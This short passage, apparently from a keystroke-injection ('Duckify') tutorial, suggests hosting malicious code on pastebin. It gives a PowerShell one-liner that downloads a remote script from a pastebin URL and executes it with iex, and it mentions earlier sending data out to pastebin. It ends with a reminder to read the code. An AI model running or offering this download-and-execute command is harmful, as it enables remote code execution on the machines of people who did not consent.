Well, we sent data to pastebin. But what if we used pastebin (or github) to host our malicious code?!
Duckify this powershell command (itâ€™s in from-pastebin.ps1) :
iex((iwr http://pastebin.com/raw.php?i=sWacjDpa).content)

But before you do. 
PLEASE LOOK AT THE CODE AND UNDERSTAND IT!
And make sure to always be vigilant
